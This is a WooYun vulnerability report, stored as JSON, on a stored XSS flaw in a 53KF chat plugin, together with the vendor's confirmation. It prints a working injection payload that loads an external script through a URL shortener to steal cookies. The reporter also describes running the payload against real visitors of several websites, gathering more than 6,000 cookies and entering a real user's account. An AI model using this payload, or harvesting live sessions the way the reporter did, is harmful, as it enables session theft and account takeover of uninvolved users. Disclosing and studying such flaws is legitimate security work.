{"id": 46353, "wybug_id": "wooyun-2015-091382", "wybug_title": "53KF某插件存储XSS跨站（华夏名网\\59互联\\7k7k等大量网站中枪）", "wybug_corp": "53KF企业在线平台", "wybug_author": "淡蓝色の忧伤", "wybug_date": "2015-01-12 19:02", "wybug_open_date": "2015-02-26 19:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向公众公开  简要描述： 很牛逼很牛逼真的很牛逼，不信，你看 详细说明：  53客服 某插件在网页右下角有个企业收藏夹\n\n点开里面有个分组。而这个分组到底是干什么的，怎么分配的。我现在也没弄清楚但是它的分组名称是可修改的。修改名称，插入代码 test\"><script src=http://is.gd/wnezNK></script>\n\n但是，审查元素去看代码。发现没有，失败了？\n\n可是实际上我们已经收到cookie了。\n\n挂了一晚上加一个上午，收获颇丰啊O(∩_∩)O哈！而且进去以后发现中枪的可不是一个域名。7k7k，华夏名网，59互联，兄弟连+一大堆小站，6千加的cookie，怎么也有几百个网站吧。\n\n根据实现分析一下当用户访问网站时，53kf会分配一个分组。53kf 的分组是按照我不知道的条件出现在网页下，而且这个分组是可以跨网站，跨用户。分组重命名的地方存在xss，插入代码后，当用户访问网页时，53客服分配的分组如果是被我们插如代码的分组的话，用户就中枪了。利用的时候，我们可以多改几个分组名，提高分组被系统选中的概率。影响挺大的，理论上只要是你们的客户就可能中枪。然后外部js代码都能执行了，你说我们能干什么？   漏洞证明：  \n\n测试中成功进入华夏名网某用户账户。\n\n\n\n   修复方案：  用户的输入都是罪恶的，so，过滤吧！影响这么多网站，而且还有域名提供商这样的重要客户，要个20rank不过分吧。   版权声明：转载请注明来源 淡蓝色の忧伤@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-12 20:14 厂商回复： 非常感谢对于问题的反馈，我们会尽快安排对问题的修复。谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}